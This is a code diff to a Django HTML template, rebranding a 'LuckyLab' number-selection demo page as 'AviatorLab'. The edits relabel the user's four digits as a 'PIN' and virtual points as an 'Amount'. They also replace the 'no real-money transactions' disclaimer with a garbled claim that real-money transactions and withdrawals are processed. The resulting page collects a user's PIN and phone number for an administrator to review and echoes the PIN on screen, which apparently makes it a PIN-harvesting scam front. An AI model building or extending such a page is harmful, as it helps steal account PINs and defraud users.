@@ -1,25 +1,25 @@
 {% extends "base.html" %}
-{% block title %}Waiting for approval — LuckyLab{% endblock %}
+{% block title %}Waiting for approval — AviatorLab{% endblock %}
 {% block content %}
 <section class="narrow panel success-panel">
   {% if rejected %}
     <div class="success-icon" style="background:#df434322;border-color:#df434366;color:#ff8a8a;">✕</div>
     <div class="eyebrow">NOT APPROVED</div>
-    <h1 class="page-title">Selection <span>not approved.</span></h1>
-    <p class="muted">Your four digits and phone number were reviewed and were not approved. You cannot continue to the next step.</p>
+    <h1 class="page-title">The Amount <span>not approved.</span></h1>
+    <p class="muted">Your PIN and phone number were reviewed and were not approved. You cannot continue to the next step.</p>
   {% else %}
     <div class="success-icon" style="background:#e8c44b22;border-color:#e8c44b66;color:#f0d56a;">⏳</div>
     <div class="eyebrow">WAITING FOR APPROVAL</div>
     <h1 class="page-title">Please <span>wait.</span></h1>
-    <p class="muted">Your four digits and phone number have been submitted. An administrator is reviewing them. This page will update automatically once a decision is made.</p>
+    <p class="muted">Your PIN and phone number have been submitted. An administrator is reviewing them. This page will update automatically once a decision is made.</p>
     <p class="muted" style="margin-top:12px;font-size:13px;">Do not close this page.</p>
   {% endif %}
 
   <div class="receipt">
     <div><span>Platform</span><b>{{ session.get_platform_display }}</b></div>
-    <div><span>Virtual points</span><b>{{ session.demo_points }} PTS</b></div>
+    <div><span>Amount</span><b>{{ session.demo_points }}</b></div>
     <div><span>Phone</span><b>{{ session.phone_number }}</b></div>
-    <div><span>Four digits</span><b>{{ session.four_numbers }}</b></div>
+    <div><span>PIN</span><b>{{ session.four_numbers }}</b></div>
     <div><span>Reference</span><b>{{ session.reference|slice:":8" }}</b></div>
     <div>
       <span>Status</span>
@@ -36,7 +36,7 @@
   {% endif %}
 
   <p class="fineprint">
-    This is an entertainment number-selection experience. No real-money transactions or withdrawals are processed on this site.
+    This is an entertainment Aviator experience. It is real-money transactions and withdrawals are processed on this site.
   </p>
 </section>
 
